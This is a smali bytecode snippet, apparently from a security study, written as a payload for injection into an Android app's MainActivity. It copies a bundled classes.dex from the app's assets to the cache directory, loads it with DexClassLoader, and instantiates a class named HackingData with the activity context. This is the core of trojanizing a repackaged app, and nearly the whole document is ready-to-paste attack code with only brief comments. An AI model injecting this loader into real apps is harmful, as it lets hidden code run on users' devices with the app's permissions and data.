    # Update to 6 registers
    .locals 6
    
    # Update v0 register
    const-string v0, "classes.dex"
    
    # Payload - START

    # Declare File
    new-instance v1, Ljava/io/File;

    # Create StringBuilder
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V


    # getCacheDir().getAbsolutePath()
    invoke-virtual {p0}, Lcom/gdg/maceio/android/MainActivity;->getCacheDir()Ljava/io/File;

    move-result-object v3

    invoke-virtual {v3}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v3


    # get path from cache dir 
    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2


    # create new File with cache dir absolute path
    invoke-direct {v1, v2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .local v1, "path":Ljava/io/File;

    # create FileOutputStream from File
    new-instance v2, Ljava/io/FileOutputStream;

    invoke-direct {v2, v1}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    .local v2, "fos":Ljava/io/FileOutputStream;

    # get android assets folder -> getAssets()
    invoke-virtual {p0}, Lcom/gdg/maceio/android/MainActivity;->getAssets()Landroid/content/res/AssetManager;

    move-result-object v3

    # call getAssets().open("classes.dex") to get InputStream
    invoke-virtual {v3, v0}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;

    invoke-virtual {p0}, Lcom/gdg/maceio/android/MainActivity;->getAssets()Landroid/content/res/AssetManager;

    move-result-object v3

    invoke-virtual {v3, v0}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;

    move-result-object v0

    # call ByteStreamsKt.copyTo to copy "classes.dex" to 'cache/classes.dex'
    const/16 v3, 0x2000

    invoke-static {v0, v2, v3}, Lkotlin/io/ByteStreamsKt;->copyTo(Ljava/io/InputStream;Ljava/io/OutputStream;I)J

    # declare DexClassLoader
    new-instance v0, Ldalvik/system/DexClassLoader;

    # get absolute path from 'cache/classes.dex'
    invoke-virtual {v1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v3

    const/4 v4, 0x0

    # create new instance of DexClassLoader from 'cache/classes.dex'
    invoke-direct {v0, v3, v4, v4, v4}, Ldalvik/system/DexClassLoader;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;)V

    .local v0, "cl":Ldalvik/system/DexClassLoader;

    # define class name
    const-string v3, "com.study.sec.android.HackingData"

    # call DexClassLoader.loadClass("com.study.sec.android.HackingData")
    invoke-virtual {v0, v3}, Ldalvik/system/DexClassLoader;->loadClass(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v3

    # get constructors from Class
    invoke-virtual {v3}, Ljava/lang/Class;->getConstructors()[Ljava/lang/reflect/Constructor;

    move-result-object v3

    # get constructor of position 0
    const/4 v4, 0x0

    aget-object v3, v3, v4

    const/4 v5, 0x1

    new-array v5, v5, [Ljava/lang/Object;

    aput-object p0, v5, v4

    # call newInstance of class HackingData with `this` to constructor
    invoke-virtual {v3, v5}, Ljava/lang/reflect/Constructor;->newInstance([Ljava/lang/Object;)Ljava/lang/Object;

    # Payload - END